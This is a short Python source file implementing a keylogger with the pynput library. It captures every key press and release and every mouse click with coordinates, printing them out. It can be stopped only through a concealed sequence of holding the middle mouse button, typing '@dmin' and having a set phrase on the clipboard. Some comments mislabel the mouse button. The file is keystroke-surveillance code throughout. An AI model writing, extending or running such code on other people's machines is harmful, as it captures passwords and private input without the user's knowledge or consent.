#// IMPORTS
import pyperclip
from pynput import keyboard, mouse

keylogger_stop = False
# password = [Boolean, String_1, String_2]
# Boolean - Need to hold mouse middle mutton, if you 
#           released befoure to finish, well try again
# String_1 - Write that password/word. Special keys
#           are ignored (alt, ctrl, cmd, shift etc.)
# String 2 - You need to have this text copyed (Ctrl + C)
#           and after you finish to write manual String_1
password = [False, "@dmin", ">> Double $$$ check! <<"]
pass_type = ""

class Keylogger:
    def __init__(self):
        Keylogger.Keyboard.Listener()
        Keylogger.Mouse.Listener()
        
    class Keyboard:
        def Press(key):
            if keylogger_stop == True: return False
            else: print(f"K_K_P: {key}")
        
        def Release(key):
            global pass_type, keylogger_stop
            # get copyed string + holding right mouse button pressed
            if password[0] == True and pass_type == password[1]:
                if pyperclip.paste().strip() == password[2]: keylogger_stop = True
                else: password[0] = False; pass_type = ""
            # write string password/word + holding right mouse button pressed
            elif password[0] == True:
                try: pass_type += key.char; print(pass_type, password[0])
                except: pass
                
            else: print(f"K_K_R: {key}")
        
        def Listener():
            l = keyboard.Listener(on_press = Keylogger.Keyboard.Press,
                                  on_release =  Keylogger.Keyboard.Release)
            l.start()

    class Mouse:
        def Click(x, y, b, p):
            global pass_type
            
            if keylogger_stop == True: return False

            # hold mouse button pressed, on release will reset the progress
            elif b == mouse.Button.middle:
                if p == True: password[0] = True
                else: password[0] = False; pass_type = ""
            else: print(f"{b} was {'pressed' if p else 'released'} at ({x} x {y})")
        
        def Listener():
            mouse.Listener(on_click = Keylogger.Mouse.Click).start()
